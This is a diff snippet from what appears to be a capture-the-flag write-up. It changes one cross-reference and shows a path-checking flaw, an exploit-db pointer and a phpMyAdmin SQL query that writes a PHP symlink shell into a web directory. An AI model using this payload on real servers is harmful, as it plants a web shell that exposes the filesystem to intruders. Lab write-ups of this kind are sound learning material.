@@ -6,7 +6,7 @@ Path checking code design error, subdirectory entry is determined via `strncmp()
 
 We can found an exploit here : exploit-db.com/exploits/27397
 
-We can exploit it by uploading a PHP page (with a SQL request in phpmyadmin like in the writeup2)
+We can exploit it by uploading a PHP page (with a SQL request in phpmyadmin like in the writeup1)
 ```SQL
 SELECT 1, '<?php symlink(\"/\", \"paths.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php'
 ```
